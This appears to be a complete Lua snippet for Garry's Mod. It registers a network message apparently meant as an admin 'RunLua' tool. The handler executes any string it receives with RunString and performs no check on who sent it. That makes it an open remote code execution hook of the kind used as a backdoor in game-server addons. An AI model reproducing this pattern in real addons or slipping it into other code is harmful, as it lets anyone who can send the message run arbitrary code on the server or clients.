net.Receive("Jonathan1358.Admin.RunLua", function(len)
	RunString(net.ReadString())
end)